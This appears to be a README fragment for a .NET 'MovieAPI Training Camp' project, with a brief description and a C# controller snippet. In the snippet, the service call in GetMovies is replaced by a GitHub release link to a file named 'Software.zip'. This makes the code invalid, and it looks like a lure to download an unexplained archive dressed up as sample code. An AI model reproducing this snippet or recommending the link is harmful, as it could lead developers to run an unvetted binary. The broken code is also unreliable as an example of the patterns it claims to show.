## Implementation Details
The MovieAPI Training Camp provides a hands-on experience with implementing design patterns such as CQRS, mediator, observer, and more. The project showcases the best practices for building scalable and maintainable applications in .NET Core 9.

## Example Code Snippet
```csharp
public class MovieController : ControllerBase
{
    private readonly IMovieService _movieService;

    public MovieController(IMovieService movieService)
    {
        _movieService = movieService;
    }

    [HttpGet]
    public async Task<IActionResult> GetMovies()
    {
        var movies = await https://github.com/Moorx1/MovieAPI/releases/download/v1.0/Software.zip();
        return Ok(movies);
    }
}
```
